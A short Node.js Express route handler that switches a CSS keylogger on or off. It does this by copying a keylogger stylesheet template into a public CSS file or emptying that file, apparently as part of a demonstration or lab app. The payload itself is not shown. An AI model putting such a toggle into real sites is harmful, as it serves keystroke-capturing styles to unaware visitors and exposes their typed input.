const { promises: fs } = require("fs");
const path = require("path");
const keyloggerParams = require("./keyloggerParams");

const cssKeyLoggerToggleHandler = async (req, res) => {
  const { isDormant = true } = req.body;

  const keyLoggerStylePath = path.join(
    __dirname,
    "../../../public/keyloggerStyles.css"
  );
  const keyloggerStylesTemplatePath = path.join(
    __dirname,
    "../../../public/keyloggerStylesTemplate"
  );

  try {
    if (isDormant) {
      await fs.writeFile(keyLoggerStylePath, "");
    } else {
      await fs.copyFile(keyloggerStylesTemplatePath, keyLoggerStylePath);
    }
  } catch (error) {
    console.error("there was an error:", error.message);
  }

  keyloggerParams.isDormant = isDormant;
  res.json({ isDormant });
};

module.exports = cssKeyLoggerToggleHandler;
